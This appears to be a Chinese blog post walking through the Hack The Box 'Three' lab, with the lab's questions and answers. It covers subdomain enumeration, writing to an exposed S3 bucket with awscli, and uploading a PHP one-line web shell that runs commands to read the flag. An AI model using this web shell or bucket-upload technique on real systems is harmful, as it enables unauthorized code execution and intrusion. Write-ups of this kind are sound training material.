@@ -1,0 +1,436 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="ReadPond">
+  <meta name="keywords" content="Hexo,博客,技术">
+  
+    <meta name="description" content="Three一、问题123456789101112131415161718How many TCP ports are open?	2What is the domain of the email address provided in the &quot;Contact&quot; section of the website?	thetoppers.htbIn the absence of a">
+<meta property="og:type" content="website">
+<meta property="og:title" content="HackBox---Three">
+<meta property="og:url" content="https://rofgd.github.io/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/HackBox-Three.html">
+<meta property="og:site_name" content="ReadPond的小屋">
+<meta property="og:description" content="Three一、问题123456789101112131415161718How many TCP ports are open?	2What is the domain of the email address provided in the &quot;Contact&quot; section of the website?	thetoppers.htbIn the absence of a">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rofgd.github.io/img/202302091327883.png">
+<meta property="article:published_time" content="2022-11-21T12:42:20.000Z">
+<meta property="article:modified_time" content="2025-03-30T12:15:04.570Z">
+<meta property="article:author" content="ReadPond">
+<meta property="article:tag" content="HackBox">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rofgd.github.io/img/202302091327883.png">
+  
+  
+  
+  <title>HackBox---Three - ReadPond的小屋</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/gradient.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rofgd.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 60vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>ReadPond的小屋</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/" target="_self">
+                    <i class="iconfont icon-a-yingyongchengxu3x"></i>
+                    <span>技术文章</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/%E6%97%A5%E5%B8%B8%E9%9A%8F%E7%AC%94/" target="_self">
+                    <i class="iconfont icon-a-wendang3x"></i>
+                    <span>日常随笔</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/categories/%E6%B8%B8%E6%88%8F%E4%BD%93%E9%AA%8C/" target="_self">
+                    <i class="iconfont icon-a-jiangzhang3x"></i>
+                    <span>游戏体验</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/202302091327883.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackBox---Three"></span>
+          
+        </div>
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          >
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<article class="page-content">
+  <h3 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h3><h5 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">How many TCP ports are <span class="hljs-keyword">open</span>?<br>	<span class="hljs-number">2</span><br>What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">domain</span> <span class="hljs-keyword">of</span> the email address provided <span class="hljs-keyword">in</span> the &quot;Contact&quot; section <span class="hljs-keyword">of</span> the website?<br>	thetoppers.htb<br><span class="hljs-keyword">In</span> the absence <span class="hljs-keyword">of</span> a DNS <span class="hljs-keyword">server</span>, which Linux file can we use <span class="hljs-keyword">to</span> resolve hostnames <span class="hljs-keyword">to</span> IP addresses <span class="hljs-keyword">in</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">to</span> be able <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the websites that <span class="hljs-type">point</span> <span class="hljs-keyword">to</span> those hostnames?<br>	/etc/hosts<br>Which sub-<span class="hljs-keyword">domain</span> <span class="hljs-keyword">is</span> discovered during further enumeration?<br>	s3.thetoppers.htb<br>Which service <span class="hljs-keyword">is</span> running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>	Amazon S3<br>Which command <span class="hljs-type">line</span> utility can be used <span class="hljs-keyword">to</span> interact <span class="hljs-keyword">with</span> the service running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>	awscli<br>Which command <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> up the AWS CLI installation?<br>	aws configure<br>What <span class="hljs-keyword">is</span> the command used <span class="hljs-keyword">by</span> the above utility <span class="hljs-keyword">to</span> list <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the S3 buckets?<br>	aws s3 ls<br>This <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> configured <span class="hljs-keyword">to</span> run files written <span class="hljs-keyword">in</span> what web scripting <span class="hljs-keyword">language</span>?<br>	PHP<br></code></pre></td></tr></table></figure>
+
+<h5 id="二、获取Flag"><a href="#二、获取Flag" class="headerlink" title="二、获取Flag"></a>二、获取Flag</h5><p>先对靶机IP进行端口扫描查看开放哪些端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112007484.png" srcset="/img/loading.gif" lazyload alt="image-20230211200724185"></p>
+<p>火狐浏览器访问该IP地址，在网页当中找到一个域名<code>thetoppers.htb</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112009222.png" srcset="/img/loading.gif" lazyload alt="image-20230211200913528"></p>
+<p>使用OneForAll进行子域名爆破找到其中一个子域名<code>s3.thetoppers.htb</code></p>
+<p>在没有 DNS 服务器的情况下，我们可以使用Hosts文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.129.192.178 thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.129.192.178 s3.thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>浏览器访问s3.thetoppers.htb</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112052435.png" srcset="/img/loading.gif" lazyload alt="image-20230211205257478"></p>
+<ul>
+<li>通过子域名爆破，得知该域名是使用亚马逊服务器，下载安装aws</li>
+<li>使用<code>aws configure</code>进行配置</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112209728.png" srcset="/img/loading.gif" lazyload alt="image-20230211220937436"></p>
+<p>查看所有s3的服务</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span> <br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112210680.png" srcset="/img/loading.gif" lazyload alt="image-20230211221044821"></p>
+<p>查看该s3下的目录及对象</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112211583.png" srcset="/img/loading.gif" lazyload alt="image-20230211221152799"></p>
+<p>编写一句话木马，使用cp命令拷贝到s3的桶里，并查看结果</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span><br><span class="language-xml">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</span><br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214972.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214735.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li><p>使用<code>cmd=cat+../flag.txt</code>可以直接拿到flag</p>
+</li>
+<li><pre><code class="hljs">http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
+</code></pre>
+</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112223189.png" srcset="/img/loading.gif" lazyload></p>
+
+
+  
+
+</article>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+<a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/containsWord.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
